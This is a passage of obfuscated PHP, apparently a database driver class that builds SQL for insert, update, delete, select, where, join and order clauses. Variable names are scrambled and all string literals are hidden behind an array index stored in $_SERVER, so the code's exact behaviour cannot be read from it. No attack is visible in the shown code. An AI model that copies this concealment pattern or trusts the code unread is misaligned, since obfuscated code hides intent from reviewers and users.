$‘“Áœ˜ !== -1 ? $‘“Áœ˜ : $ËÀ¡şÕÂ; $ğ’õî ™ = array($ªı´Ãîé[946] => isset($İ°œñÁ[$ªı´Ãîé[946]][$ËÀ¡şÕÂ]) ? $İ°œñÁ[$ªı´Ãîé[946]][$ËÀ¡şÕÂ] : $İ°œñÁ[$ªı´Ãîé[946]][0], $ªı´Ãîé[947] => isset($İ°œñÁ[$ªı´Ãîé[947]][$ËÀ¡şÕÂ]) ? $İ°œñÁ[$ªı´Ãîé[947]][$ËÀ¡şÕÂ] : $İ°œñÁ[$ªı´Ãîé[947]][0], $ªı´Ãîé[944] => isset($İ°œñÁ[$ªı´Ãîé[944]][$ËÀ¡şÕÂ]) ? $İ°œñÁ[$ªı´Ãîé[944]][$ËÀ¡şÕÂ] : $İ°œñÁ[$ªı´Ãîé[944]][0], $ªı´Ãîé[945] => isset($İ°œñÁ[$ªı´Ãîé[945]][$ËÀ¡şÕÂ]) ? $İ°œñÁ[$ªı´Ãîé[945]][$ËÀ¡şÕÂ] : $İ°œñÁ[$ªı´Ãîé[945]][0], $ªı´Ãîé[21] => isset($İ°œñÁ[$ªı´Ãîé[21]][$ËÀ¡şÕÂ]) ? $İ°œñÁ[$ªı´Ãîé[21]][$ËÀ¡şÕÂ] : $İ°œñÁ[$ªı´Ãîé[21]][0], $ªı´Ãîé[974] => isset($İ°œñÁ[$ªı´Ãîé[974]][$ËÀ¡şÕÂ]) ? $İ°œñÁ[$ªı´Ãîé[974]][$ËÀ¡şÕÂ] : $İ°œñÁ[$ªı´Ãîé[974]][0], $ªı´Ãîé[17] => isset($İ°œñÁ[$ªı´Ãîé[17]][$ËÀ¡şÕÂ]) ? $İ°œñÁ[$ªı´Ãîé[17]][$ËÀ¡şÕÂ] : $İ°œñÁ[$ªı´Ãîé[17]][0]); return $this->connect($ğ’õî ™, $ËÀ¡şÕÂ); } public function parseDSN($Á’•“ÂÆ) { $¥¶ª—İ‚ =& $_SERVER[íû‘ş´]; if (empty($Á’•“ÂÆ)) { return !1; } $³£Ûë€… = parse_url($Á’•“ÂÆ); if ($³£Ûë€…[$¥¶ª—İ‚[195]]) { $ÍÄ³Õèñ = array($¥¶ª—İ‚[1019] => $³£Ûë€…[$¥¶ª—İ‚[195]], $¥¶ª—İ‚[946] => isset($³£Ûë€…[$¥¶ª—İ‚[640]]) ? $³£Ûë€…[$¥¶ª—İ‚[640]] : $¥¶ª—İ‚[12], $¥¶ª—İ‚[947] => isset($³£Ûë€…[$¥¶ª—İ‚[1043]]) ? $³£Ûë€…[$¥¶ª—İ‚[1043]] : $¥¶ª—İ‚[12], $¥¶ª—İ‚[944] => isset($³£Ûë€…[$¥¶ª—İ‚[196]]) ? $³£Ûë€…[$¥¶ª—İ‚[196]] : $¥¶ª—İ‚[12], $¥¶ª—İ‚[945] => isset($³£Ûë€…[$¥¶ª—İ‚[197]]) ? $³£Ûë€…[$¥¶ª—İ‚[197]] : $¥¶ª—İ‚[12], $¥¶ª—İ‚[21] => isset($³£Ûë€…[$¥¶ª—İ‚[84]]) ? substr($³£Ûë€…[$¥¶ª—İ‚[84]], 1) : $¥¶ª—İ‚[12]); } else { preg_match($¥¶ª—İ‚[1044], trim($Á’•“ÂÆ), $¹É¥ìåÑ); $ÍÄ³Õèñ = array($¥¶ª—İ‚[1019] => $¹É¥ìåÑ[1], $¥¶ª—İ‚[946] => $¹É¥ìåÑ[2], $¥¶ª—İ‚[947] => $¹É¥ìåÑ[3], $¥¶ª—İ‚[944] => $¹É¥ìåÑ[4], $¥¶ª—İ‚[945] => $¹É¥ìåÑ[5], $¥¶ª—İ‚[21] => $¹É¥ìåÑ[6]); } $ÍÄ³Õèñ[$¥¶ª—İ‚[974]] = $¥¶ª—İ‚[12]; return $ÍÄ³Õèñ; } protected function debug() { $§Êºüä¹ =& $_SERVER[íû‘ş´]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $§Êºüä¹[1045]; if (think_config($§Êºüä¹[1046])) { think_status($§Êºüä¹[1047]); think_trace($this->queryStr . $§Êºüä¹[1048] . think_status($§Êºüä¹[24], $§Êºüä¹[1047], 6) . $§Êºüä¹[1049], $§Êºüä¹[12], $§Êºüä¹[1050]); } } protected function parseLock($Ù²°£â§ = false) { $§¾ÇªÕ´ =& $_SERVER[íû‘ş´]; if (!$Ù²°£â§) { return $§¾ÇªÕ´[12]; } if ($§¾ÇªÕ´[976] == $this->dbType) { return $§¾ÇªÕ´[1051]; } return $§¾ÇªÕ´[1052]; } protected function parseSet($±ı¬§Õ) { $Ç¡Å¨¹ =& $_SERVER[íû‘ş´]; foreach ($±ı¬§Õ as $ôó÷¬×¸ => $–ïˆşìÌ) { if (is_array($–ïˆşìÌ) && $Ç¡Å¨¹[341] == $–ïˆşìÌ[0]) { $îëš¸ëÁ[] = $this->parseKey($ôó÷¬×¸) . $Ç¡Å¨¹[942] . $–ïˆşìÌ[1]; } elseif (is_scalar($–ïˆşìÌ) || is_null($–ïˆşìÌ)) { $îëš¸ëÁ[] = $this->parseKey($ôó÷¬×¸) . $Ç¡Å¨¹[942] . $this->parseValue($–ïˆşìÌ); } } return $Ç¡Å¨¹[1053] . implode($Ç¡Å¨¹[50], $îëš¸ëÁ); } protected function bindParam($ğƒ¾ßÓÇ, $ûç‰ø˜”) { $this->bind[$_SERVER[íû‘ş´][4] . $ğƒ¾ßÓÇ] = $ûç‰ø˜”; } protected function parseBind($Íªâş¶¢) { $Íªâş¶¢ = array_merge($this->bind, $Íªâş¶¢); $this->bind = array(); return $Íªâş¶¢; } function parseKey(&$ı»Ûµ€˜, $ê‚º¹Ò = true) { if ($ê‚º¹Ò) { $ı»Ûµ€˜ = $this->parseKeyCheck($ı»Ûµ€˜); } return $ı»Ûµ€˜; } function parseKeyCheck($¨ƒ±”è) { $Ãî¯·íƒ =& $_SERVER[íû‘ş´]; $¨ƒ±”è = trim($¨ƒ±”è); if (!preg_match($Ãî¯·íƒ[1054], $¨ƒ±”è)) { think_exception($Ãî¯·íƒ[1055] . $¨ƒ±”è); } return $¨ƒ±”è; } protected function parseValue($ÛÂÏ¨©×) { $‡äŠëç“ =& $_SERVER[íû‘ş´]; if (is_string($ÛÂÏ¨©×)) { $ÛÂÏ¨©× = $‡äŠëç“[1015] . $this->escapeString($ÛÂÏ¨©×) . $‡äŠëç“[1015]; } elseif (isset($ÛÂÏ¨©×[0]) && is_string($ÛÂÏ¨©×[0]) && strtolower($ÛÂÏ¨©×[0]) == $‡äŠëç“[341]) { $ÛÂÏ¨©× = $this->escapeString($ÛÂÏ¨©×[1]); } elseif (is_array($ÛÂÏ¨©×)) { $ÛÂÏ¨©× = array_map(array($this, $‡äŠëç“[1016]), $ÛÂÏ¨©×); } elseif (is_bool($ÛÂÏ¨©×)) { $ÛÂÏ¨©× = $ÛÂÏ¨©× ? $‡äŠëç“[88] : $‡äŠëç“[212]; } elseif (is_null($ÛÂÏ¨©×)) { $ÛÂÏ¨©× = $‡äŠëç“[103]; } return $ÛÂÏ¨©×; } protected function parseField($‚®×İ«¯) { $ÛÅÄ Îà =& $_SERVER[íû‘ş´]; if (is_string($‚®×İ«¯) && strpos($‚®×İ«¯, $ÛÅÄ Îà[50])) { $‚®×İ«¯ = explode($ÛÅÄ Îà[50], $‚®×İ«¯); } if (is_array($‚®×İ«¯)) { $¦¨­¤¹è = array(); foreach ($‚®×İ«¯ as $µë‚âŠ => $¸Š¥åüò) { if (!is_numeric($µë‚âŠ)) { $¦¨­¤¹è[] = $this->parseKey($µë‚âŠ, !1) . $ÛÅÄ Îà[1056] . $this->parseKey($¸Š¥åüò); } else { $¦¨­¤¹è[] = $this->parseKey($¸Š¥åüò); } } $µ­¬Ìœ© = implode($ÛÅÄ Îà[50], $¦¨­¤¹è); } elseif (is_string($‚®×İ«¯) && !empty($‚®×İ«¯)) { $µ­¬Ìœ© = $‚®×İ«¯; } else { $µ­¬Ìœ© = $ÛÅÄ Îà[203]; } return $µ­¬Ìœ©; } protected function parseTable($£æØ‹úÅ) { $›õÒ®ù¬ =& $_SERVER[íû‘ş´]; if (is_array($£æØ‹úÅ)) { $Ñõ¯ÎŒƒ = array(); foreach ($£æØ‹úÅ as $Ê¤ÑöÍ» => $Óë€ÄÒ) { if (!is_numeric($Ê¤ÑöÍ»)) { $Ñõ¯ÎŒƒ[] = $this->parseKey($Ê¤ÑöÍ») . $›õÒ®ù¬[53] . $this->parseKey($Óë€ÄÒ); } else { $Ñõ¯ÎŒƒ[] = $this->parseKey($Ê¤ÑöÍ»); } } $£æØ‹úÅ = $Ñõ¯ÎŒƒ; } elseif (is_string($£æØ‹úÅ)) { if (strstr($£æØ‹úÅ, $›õÒ®ù¬[53])) { return $£æØ‹úÅ; } $£æØ‹úÅ = explode($›õÒ®ù¬[50], $£æØ‹úÅ); array_walk($£æØ‹úÅ, array($this, $›õÒ®ù¬[964])); } return $›õÒ®ù¬[958] . trim(implode($›õÒ®ù¬[1057], $£æØ‹úÅ), $›õÒ®ù¬[429]) . $›õÒ®ù¬[958]; } protected function parseWhere($Ì–†‹Í®) { $‹çİÁÆ• =& $_SERVER[íû‘ş´]; $¬½’İıÊ = $‹çİÁÆ•[12]; if (is_string($Ì–†‹Í®)) { $¬½’İıÊ = $Ì–†‹Í®; } else { $‚û£Ø = isset($Ì–†‹Í®[$‹çİÁÆ•[1058]]) ? strtoupper($Ì–†‹Í®[$‹çİÁÆ•[1058]]) : $‹çİÁÆ•[12]; if (in_array($‚û£Ø, array($‹çİÁÆ•[1059], $‹çİÁÆ•[1060], $‹çİÁÆ•[1061]))) { $‚û£Ø = $‹çİÁÆ•[53] . $‚û£Ø . $‹çİÁÆ•[53]; unset($Ì–†‹Í®[$‹çİÁÆ•[1058]]); } else { $‚û£Ø = $‹çİÁÆ•[1062]; } foreach ($Ì–†‹Í® as $”ÊêŒ½ => $ºì˜ãÉ) { $¬½’İıÊ .= $‹çİÁÆ•[321]; if (is_numeric($”ÊêŒ½)) { $”ÊêŒ½ = $‹çİÁÆ•[1063]; } if (0 === strpos($”ÊêŒ½, $‹çİÁÆ•[11])) { $¬½’İıÊ .= $this->parseThinkWhere($”ÊêŒ½, $ºì˜ãÉ); } else { if (!preg_match($‹çİÁÆ•[1064], trim($”ÊêŒ½))) { think_exception(think_lang($‹çİÁÆ•[1065]) . $‹çİÁÆ•[4] . $”ÊêŒ½); } $°şó³™ = is_array($ºì˜ãÉ) && isset($ºì˜ãÉ[$‹çİÁÆ•[1066]]); $”ÊêŒ½ = trim($”ÊêŒ½); if (strpos($”ÊêŒ½, $‹çİÁÆ•[327])) { $£Äæá­» = explode($‹çİÁÆ•[327], $”ÊêŒ½); $µß¨ä´“ = array(); foreach ($£Äæá­» as $çÅêÌÖì => $´¼’àûù) { $„Ï‘ßì = $°şó³™ ? $ºì˜ãÉ[$çÅêÌÖì] : $ºì˜ãÉ; $µß¨ä´“[] = $‹çİÁÆ•[304] . $this->parseWhereItem($this->parseKey($´¼’àûù), $„Ï‘ßì) . $‹çİÁÆ•[963]; } $¬½’İıÊ .= implode($‹çİÁÆ•[1067], $µß¨ä´“); } elseif (strpos($”ÊêŒ½, $‹çİÁÆ•[328])) { $£Äæá­» = explode($‹çİÁÆ•[328], $”ÊêŒ½); $µß¨ä´“ = array(); foreach ($£Äæá­» as $çÅêÌÖì => $´¼’àûù) { $„Ï‘ßì = $°şó³™ ? $ºì˜ãÉ[$çÅêÌÖì] : $ºì˜ãÉ; $µß¨ä´“[] = $‹çİÁÆ•[304] . $this->parseWhereItem($this->parseKey($´¼’àûù), $„Ï‘ßì) . $‹çİÁÆ•[963]; } $¬½’İıÊ .= implode($‹çİÁÆ•[1062], $µß¨ä´“); } else { $¬½’İıÊ .= $this->parseWhereItem($this->parseKey($”ÊêŒ½), $ºì˜ãÉ); } } $¬½’İıÊ .= $‹çİÁÆ•[322] . $‚û£Ø; } $¬½’İıÊ = substr($¬½’İıÊ, 0, -strlen($‚û£Ø)); } return empty($¬½’İıÊ) ? $‹çİÁÆ•[12] : $‹çİÁÆ•[1068] . $¬½’İıÊ; } protected function parseWhereItem($ğ×±…, $äÂ½ÖÔ) { $¤ñ¿û¬ =& $_SERVER[íû‘ş´]; $İÊ°ÅÜÇ = $¤ñ¿û¬[12]; if (is_array($äÂ½ÖÔ)) { if (is_string($äÂ½ÖÔ[0])) { $­‰â±ÀÄ = strtolower($äÂ½ÖÔ[0]); if (in_array($äÂ½ÖÔ[0], array($¤ñ¿û¬[942], $¤ñ¿û¬[1069], $¤ñ¿û¬[1070], $¤ñ¿û¬[1071], $¤ñ¿û¬[1072], $¤ñ¿û¬[1073]))) { $İÊ°ÅÜÇ .= $ğ×±… . $¤ñ¿û¬[53] . $äÂ½ÖÔ[0] . $¤ñ¿û¬[53] . $this->parseValue($äÂ½ÖÔ[1]); } elseif (preg_match($¤ñ¿û¬[1074], $äÂ½ÖÔ[0])) { $İÊ°ÅÜÇ .= $ğ×±… . $¤ñ¿û¬[53] . $this->exp[$­‰â±ÀÄ] . $¤ñ¿û¬[53] . $this->parseValue($äÂ½ÖÔ[1]); } elseif (preg_match($¤ñ¿û¬[1075], $äÂ½ÖÔ[0])) { if (is_array($äÂ½ÖÔ[1])) { $¹¼Ÿ¸¼á = isset($äÂ½ÖÔ[2]) ? strtoupper($äÂ½ÖÔ[2]) : $¤ñ¿û¬[1060]; if (in_array($¹¼Ÿ¸¼á, array($¤ñ¿û¬[1059], $¤ñ¿û¬[1060], $¤ñ¿û¬[1061]))) { $ú½ÉÊşá = array(); foreach ($äÂ½ÖÔ[1] as $–ŒõÕé) { $ú½ÉÊşá[] = $ğ×±… . $¤ñ¿û¬[53] . $this->exp[$­‰â±ÀÄ] . $¤ñ¿û¬[53] . $this->parseValue($–ŒõÕé); } $İÊ°ÅÜÇ .= $¤ñ¿û¬[304] . implode($¤ñ¿û¬[53] . $¹¼Ÿ¸¼á . $¤ñ¿û¬[53], $ú½ÉÊşá) . $¤ñ¿û¬[963]; } } else { $İÊ°ÅÜÇ .= $ğ×±… . $¤ñ¿û¬[53] . $this->exp[$­‰â±ÀÄ] . $¤ñ¿û¬[53] . $this->parseValue($äÂ½ÖÔ[1]); } } elseif ($¤ñ¿û¬[341] == $­‰â±ÀÄ) { $İÊ°ÅÜÇ .= $¤ñ¿û¬[961] . $ğ×±… . $¤ñ¿û¬[53] . $äÂ½ÖÔ[1] . $¤ñ¿û¬[1076]; } elseif (preg_match($¤ñ¿û¬[1077], $äÂ½ÖÔ[0])) { $İÊ°ÅÜÇ .= $äÂ½ÖÔ[0]; } elseif (preg_match($¤ñ¿û¬[1078], $äÂ½ÖÔ[0])) { if (isset($äÂ½ÖÔ[2]) && $¤ñ¿û¬[341] == $äÂ½ÖÔ[2]) { $İÊ°ÅÜÇ .= $ğ×±… . $¤ñ¿û¬[53] . $this->exp[$­‰â±ÀÄ] . $¤ñ¿û¬[53] . $äÂ½ÖÔ[1]; } else { if (is_string($äÂ½ÖÔ[1])) { $äÂ½ÖÔ[1] = explode($¤ñ¿û¬[50], $äÂ½ÖÔ[1]); } $„û“ ¤ = implode($¤ñ¿û¬[50], $this->parseValue($äÂ½ÖÔ[1])); $İÊ°ÅÜÇ .= $ğ×±… . $¤ñ¿û¬[53] . $this->exp[$­‰â±ÀÄ] . $¤ñ¿û¬[961] . $„û“ ¤ . $¤ñ¿û¬[963]; } } elseif (preg_match($¤ñ¿û¬[1079], $äÂ½ÖÔ[0])) { $ÕµÆØğ… = is_string($äÂ½ÖÔ[1]) ? explode($¤ñ¿û¬[50], $äÂ½ÖÔ[1]) : $äÂ½ÖÔ[1]; $İÊ°ÅÜÇ .= $¤ñ¿û¬[961] . $ğ×±… . $¤ñ¿û¬[53] . $this->exp[$­‰â±ÀÄ] . $¤ñ¿û¬[53] . $this->parseValue($ÕµÆØğ…[0]) . $¤ñ¿û¬[1062] . $this->parseValue($ÕµÆØğ…[1]) . $¤ñ¿û¬[322]; } else { think_exception(think_lang($¤ñ¿û¬[1065]) . $¤ñ¿û¬[4] . $äÂ½ÖÔ[0]); } } else { $à±¼›Şä = count($äÂ½ÖÔ); $ãƒ÷”û = $¤ñ¿û¬[12]; if (is_string($äÂ½ÖÔ[$à±¼›Şä - 1])) { $ãƒ÷”û = isset($äÂ½ÖÔ[$à±¼›Şä - 1]) ? strtoupper($äÂ½ÖÔ[$à±¼›Şä - 1]) : $¤ñ¿û¬[12]; if (in_array($ãƒ÷”û, array($¤ñ¿û¬[1059], $¤ñ¿û¬[1060], $¤ñ¿û¬[1061]))) { $à±¼›Şä = $à±¼›Şä - 1; } } else { $ãƒ÷”û = $¤ñ¿û¬[1059]; } for ($ı±¹¥Ş = 0; $ı±¹¥Ş < $à±¼›Şä; $ı±¹¥Ş++) { $ÕµÆØğ… = is_array($äÂ½ÖÔ[$ı±¹¥Ş]) ? $äÂ½ÖÔ[$ı±¹¥Ş][1] : $äÂ½ÖÔ[$ı±¹¥Ş]; if ($¤ñ¿û¬[341] == strtolower($äÂ½ÖÔ[$ı±¹¥Ş][0])) { $İÊ°ÅÜÇ .= $¤ñ¿û¬[304] . $ğ×±… . $¤ñ¿û¬[53] . $ÕµÆØğ… . $¤ñ¿û¬[1076] . $ãƒ÷”û . $¤ñ¿û¬[53]; } else { $¦áî­œù = is_array($äÂ½ÖÔ[$ı±¹¥Ş]) ? $this->exp[strtolower($äÂ½ÖÔ[$ı±¹¥Ş][0])] : $¤ñ¿û¬[942]; if (!$¦áî­œù && is_array($äÂ½ÖÔ[$ı±¹¥Ş]) && in_array($äÂ½ÖÔ[$ı±¹¥Ş][0], array($¤ñ¿û¬[942], $¤ñ¿û¬[1069], $¤ñ¿û¬[1070], $¤ñ¿û¬[1071], $¤ñ¿û¬[1072], $¤ñ¿û¬[1073]))) { $¦áî­œù = $äÂ½ÖÔ[$ı±¹¥Ş][0]; } $İÊ°ÅÜÇ .= $¤ñ¿û¬[304] . $ğ×±… . $¤ñ¿û¬[53] . $¦áî­œù . $¤ñ¿û¬[53] . $this->parseValue($ÕµÆØğ…) . $¤ñ¿û¬[1076] . $ãƒ÷”û . $¤ñ¿û¬[53]; } } $İÊ°ÅÜÇ = substr($İÊ°ÅÜÇ, 0, -4); } } else { $İÊ°ÅÜÇ .= $ğ×±… . $¤ñ¿û¬[1080] . $this->parseValue($äÂ½ÖÔ); } return $İÊ°ÅÜÇ; } protected function parseThinkWhere($êøâã°·, $ØøºÙ‚˜) { $Ğ•“Ä–· =& $_SERVER[íû‘ş´]; $“ÔÔ’´ = $Ğ•“Ä–·[12]; switch ($êøâã°·) { case $Ğ•“Ä–·[396]: $“ÔÔ’´ = $ØøºÙ‚˜; break; case $Ğ•“Ä–·[1063]: $“ÔÔ’´ = is_string($ØøºÙ‚˜) ? $ØøºÙ‚˜ : substr($this->parseWhere($ØøºÙ‚˜), 6); break; case $Ğ•“Ä–·[1081]: parse_str($ØøºÙ‚˜, $éş‰ü™); if (isset($éş‰ü™[$Ğ•“Ä–·[1058]])) { $Áª°®±Ï = $Ğ•“Ä–·[53] . strtoupper($éş‰ü™[$Ğ•“Ä–·[1058]]) . $Ğ•“Ä–·[53]; unset($éş‰ü™[$Ğ•“Ä–·[1058]]); } else { $Áª°®±Ï = $Ğ•“Ä–·[1062]; } $¹µ•Û¹Î = array(); foreach ($éş‰ü™ as $¼ïÇèÒ± => $Ò´ÅŞ¶Ğ) { $¹µ•Û¹Î[] = $this->parseKey($¼ïÇèÒ±) . $Ğ•“Ä–·[1080] . $this->parseValue($Ò´ÅŞ¶Ğ); } $“ÔÔ’´ = implode($Áª°®±Ï, $¹µ•Û¹Î); break; } return $“ÔÔ’´; } protected function parseLimit($€ºğÕŸÊ) { $¨˜ğ¨üˆ =& $_SERVER[íû‘ş´]; return !empty($€ºğÕŸÊ) ? $¨˜ğ¨üˆ[51] . $€ºğÕŸÊ . $¨˜ğ¨üˆ[53] : $¨˜ğ¨üˆ[12]; } protected function parseJoin($®–‹¾ÇÎ) { $´èÜÓ´­ =& $_SERVER[íû‘ş´]; $¥Ÿ¬ñøô = $´èÜÓ´­[12]; if (!empty($®–‹¾ÇÎ)) { if (is_array($®–‹¾ÇÎ)) { foreach ($®–‹¾ÇÎ as $ËêØ’¼ => $Æ‰ü¼¤) { if (!1 !== stripos($Æ‰ü¼¤, $´èÜÓ´­[1082])) { $¥Ÿ¬ñøô .= $´èÜÓ´­[53] . $Æ‰ü¼¤; } else { $¥Ÿ¬ñøô .= $´èÜÓ´­[1083] . $Æ‰ü¼¤; } } } else { $¥Ÿ¬ñøô .= $´èÜÓ´­[1083] . $®–‹¾ÇÎ; } } $¥Ÿ¬ñøô = preg_replace($´èÜÓ´­[1084], think_config($´èÜÓ´­[988]) . $´èÜÓ´­[1085], $¥Ÿ¬ñøô); return $¥Ÿ¬ñøô; } protected function parseOrder($¨Œ¼ºô) { $²šÆÁ”ó =& $_SERVER[íû‘ş´]; if (is_array($¨Œ¼ºô)) { $€ï‹¤Ú = array(); foreach ($¨Œ¼ºô as $åìé†‡  => $õ½îì) { if (is_numeric($åìé†‡ )) { $€ï‹¤Ú[] = $this->parseKey($õ½îì); } else { $õ½îì = in_array(strtoupper(trim($õ½îì)), array($²šÆÁ”ó[1086], $²šÆÁ”ó[1087])) ? $²šÆÁ”ó[53] . $õ½îì : $²šÆÁ”ó[12]; if (preg_match($²šÆÁ”ó[1088], $åìé†‡ )) { $€ï‹¤Ú[] = $this->parseKey($åìé†‡ ) . $õ½îì; } else { think_exception($²šÆÁ”ó[1089] . $åìé†‡ ); } } } $¨Œ¼ºô = implode($²šÆÁ”ó[50], $€ï‹¤Ú); } return !empty($¨Œ¼ºô) ? $²šÆÁ”ó[1090] . $¨Œ¼ºô : $²šÆÁ”ó[12]; } protected function parseGroup($ÖÔ¾ÛÖÖ) { $·ÌËÖÃ˜ =& $_SERVER[íû‘ş´]; return !empty($ÖÔ¾ÛÖÖ) ? $·ÌËÖÃ˜[1091] . $ÖÔ¾ÛÖÖ : $·ÌËÖÃ˜[12]; } protected function parseHaving($Å­‹ì÷) { $¼í±œÜÙ =& $_SERVER[íû‘ş´]; return !empty($Å­‹ì÷) ? $¼í±œÜÙ[1092] . $Å­‹ì÷ : $¼í±œÜÙ[12]; } protected function parseComment($ë‚İ¹ûĞ) { $ÀÃµ½– =& $_SERVER[íû‘ş´]; return !empty($ë‚İ¹ûĞ) ? $ÀÃµ½–[1093] . $ë‚İ¹ûĞ . $ÀÃµ½–[1094] : $ÀÃµ½–[12]; } protected function parseDistinct($›â°µ÷Ÿ) { $ÈÏ£”ã =& $_SERVER[íû‘ş´]; return !empty($›â°µ÷Ÿ) ? $ÈÏ£”ã[1095] : $ÈÏ£”ã[12]; } protected function parseUnion($¢¥„ÙğŒ) { $Ê’›À´‚ =& $_SERVER[íû‘ş´]; if (empty($¢¥„ÙğŒ)) { return $Ê’›À´‚[12]; } if (isset($¢¥„ÙğŒ[$Ê’›À´‚[392]])) { $‹èíÊ° = $Ê’›À´‚[1096]; unset($¢¥„ÙğŒ[$Ê’›À´‚[392]]); } else { $‹èíÊ° = $Ê’›À´‚[1097]; } foreach ($¢¥„ÙğŒ as $‚½ü˜¨Ê) { $®ÈĞô®ü[] = $‹èíÊ° . (is_array($‚½ü˜¨Ê) ? $this->buildSelectSql($‚½ü˜¨Ê) : $‚½ü˜¨Ê); } return implode($Ê’›À´‚[53], $®ÈĞô®ü); } public function insert($ëÛ»™²Ê, $„ñË€ò = array(), $ä³ƒØ = false) { $Ó’î”œä =& $_SERVER[íû‘ş´]; $¼ØÚ’í  = $Êœ€±´ˆ = array(); $this->model = $„ñË€ò[$Ó’î”œä[325]]; foreach ($ëÛ»™²Ê as $âôä¾á‚ => $Æ‘Ì‡¸) { if (is_array($Æ‘Ì‡¸) && $Ó’î”œä[341] == $Æ‘Ì‡¸[0]) { $Êœ€±´ˆ[] = $this->parseKey($âôä¾á‚); $¼ØÚ’í [] = $Æ‘Ì‡¸[1]; } elseif (is_scalar($Æ‘Ì‡¸) || is_null($Æ‘Ì‡¸)) { $Êœ€±´ˆ[] = $this->parseKey($âôä¾á‚); $¼ØÚ’í [] = $this->parseValue($Æ‘Ì‡¸); } } $ÔøÏ¹Ë× = ($ä³ƒØ ? $Ó’î”œä[965] : $Ó’î”œä[966]) . $Ó’î”œä[967] . $this->parseTable($„ñË€ò[$Ó’î”œä[323]]) . $Ó’î”œä[961] . implode($Ó’î”œä[50], $Êœ€±´ˆ) . $Ó’î”œä[962] . implode($Ó’î”œä[50], $¼ØÚ’í ) . $Ó’î”œä[963]; $ÔøÏ¹Ë× .= $this->parseLock(isset($„ñË€ò[$Ó’î”œä[903]]) ? $„ñË€ò[$Ó’î”œä[903]] : !1); $ÔøÏ¹Ë× .= $this->parseComment(!empty($„ñË€ò[$Ó’î”œä[398]]) ? $„ñË€ò[$Ó’î”œä[398]] : $Ó’î”œä[12]); return $this->execute($ÔøÏ¹Ë×, $this->parseBind(!empty($„ñË€ò[$Ó’î”œä[329]]) ? $„ñË€ò[$Ó’î”œä[329]] : array())); } public function selectInsert($™Œ²É , $º—Ï¥Ü, $à‚—‚ú = array()) { $ÃĞğÇ÷ =& $_SERVER[íû‘ş´]; $this->model = $à‚—‚ú[$ÃĞğÇ÷[325]]; if (is_string($™Œ²É )) { $™Œ²É  = explode($ÃĞğÇ÷[50], $™Œ²É ); } array_walk($™Œ²É , array($this, $ÃĞğÇ÷[964])); $îàÓÎ¨ = $ÃĞğÇ÷[1098] . $this->parseTable($º—Ï¥Ü) . $ÃĞğÇ÷[961] . implode($ÃĞğÇ÷[50], $™Œ²É ) . $ÃĞğÇ÷[1076]; $îàÓÎ¨ .= $this->buildSelectSql($à‚—‚ú); return $this->execute($îàÓÎ¨, $this->parseBind(!empty($à‚—‚ú[$ÃĞğÇ÷[329]]) ? $à‚—‚ú[$ÃĞğÇ÷[329]] : array())); } public function update($´ê¬™‚, $ÉŸèóâä) { $°¡É‹–ü =& $_SERVER[íû‘ş´]; $this->model = $ÉŸèóâä[$°¡É‹–ü[325]]; $¯¹Ü•Ğ = $°¡É‹–ü[1099] . $this->parseTable($ÉŸèóâä[$°¡É‹–ü[323]]) . $this->parseSet($´ê¬™‚) . $this->parseWhere(!empty($ÉŸèóâä[$°¡É‹–ü[319]]) ? $ÉŸèóâä[$°¡É‹–ü[319]] : $°¡É‹–ü[12]) . $this->parseOrder(!empty($ÉŸèóâä[$°¡É‹–ü[409]]) ? $ÉŸèóâä[$°¡É‹–ü[409]] : $°¡É‹–ü[12]) . $this->parseLimit(!empty($ÉŸèóâä[$°¡É‹–ü[336]]) ? $ÉŸèóâä[$°¡É‹–ü[336]] : $°¡É‹–ü[12]) . $this->parseLock(isset($ÉŸèóâä[$°¡É‹–ü[903]]) ? $ÉŸèóâä[$°¡É‹–ü[903]] : !1) . $this->parseComment(!empty($ÉŸèóâä[$°¡É‹–ü[398]]) ? $ÉŸèóâä[$°¡É‹–ü[398]] : $°¡É‹–ü[12]); return $this->execute($¯¹Ü•Ğ, $this->parseBind(!empty($ÉŸèóâä[$°¡É‹–ü[329]]) ? $ÉŸèóâä[$°¡É‹–ü[329]] : array())); } public function delete($±‡¨¨²§ = array()) { $úŠ Ê¼Á =& $_SERVER[íû‘ş´]; $this->model = $±‡¨¨²§[$úŠ Ê¼Á[325]]; $Î«èˆÕ = $úŠ Ê¼Á[1100] . $this->parseTable($±‡¨¨²§[$úŠ Ê¼Á[323]]) . $this->parseWhere(!empty($±‡¨¨²§[$úŠ Ê¼Á[319]]) ? $±‡¨¨²§[$úŠ Ê¼Á[319]] : $úŠ Ê¼Á[12]) . $this->parseOrder(!empty($±‡¨¨²§[$úŠ Ê¼Á[409]]) ? $±‡¨¨²§[$úŠ Ê¼Á[409]] : $úŠ Ê¼Á[12]) . $this->parseLimit(!empty($±‡¨¨²§[$úŠ Ê¼Á[336]]) ? $±‡¨¨²§[$úŠ Ê¼Á[336]] : $úŠ Ê¼Á[12]) . $this->parseLock(isset($±‡¨¨²§[$úŠ Ê¼Á[903]]) ? $±‡¨¨²§[$úŠ Ê¼Á[903]] : !1) . $this->parseComment(!empty($±‡¨¨²§[$úŠ Ê¼Á[398]]) ? $±‡¨¨²§[$úŠ Ê¼Á[398]] : $úŠ Ê¼Á[12]); return $this->execute($Î«èˆÕ, $this->parseBind(!empty($±‡¨¨²§[$úŠ Ê¼Á[329]]) ? $±‡¨¨²§[$úŠ Ê¼Á[329]] : array())); } public function select($õ“÷®ôÍ = array()) { $¯©ç›æ =& $_SERVER[íû‘ş´]; $this->model = $õ“÷®ôÍ[$¯©ç›æ[325]]; $«º·ƒÈ = $this->buildSelectSql($õ“÷®ôÍ); $Ò¸çëú = isset($õ“÷®ôÍ[$¯©ç›æ[393]]) ? $õ“÷®ôÍ[$¯©ç›æ[393]] : !1; if ($Ò¸çëú) { $–‘´ÆÀ¡ = is_string($Ò¸çëú[$¯©ç›æ[94]]) ? $Ò¸çëú[$¯©ç›æ[94]] : $¯©ç›æ[1101] . md5($«º·ƒÈ); $í®áÏ¯Û = think_cache($–‘´ÆÀ¡, $¯©ç›æ[12], $Ò¸çëú); if (!1 !== $í®áÏ¯Û) { return $í®áÏ¯Û; } } $É¤²àÌ = $this->query($«º·ƒÈ, $this->parseBind(!empty($õ“÷®ôÍ[$¯©ç›æ[329]]) ? $õ“÷®ôÍ[$¯©ç›æ[329]] : array())); if ($Ò¸çëú && !1 !== $É¤²àÌ) { think_cache($–‘´ÆÀ¡, $É¤²àÌ, $Ò¸çëú); } return $É¤²àÌ; } public function buildSelectSql($Ù‰­é‚ = array()) { $éÂ°—Öé =& $_SERVER[íû‘ş´]; if 